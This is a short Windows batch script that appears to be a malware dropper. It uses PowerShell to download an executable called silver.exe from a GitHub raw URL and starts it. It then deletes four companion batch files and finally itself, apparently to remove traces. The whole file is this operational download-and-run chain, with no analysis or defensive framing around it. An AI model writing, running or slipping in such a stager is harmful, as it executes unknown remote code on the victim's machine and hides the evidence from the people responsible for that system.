powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://github.com/Cisfran05/google/raw/main/silver.exe', '.\silver.exe') }
start silver.exe
del "101.bat"
del "102.bat"
del "103.bat"
del "104.bat"
del "%~f0"
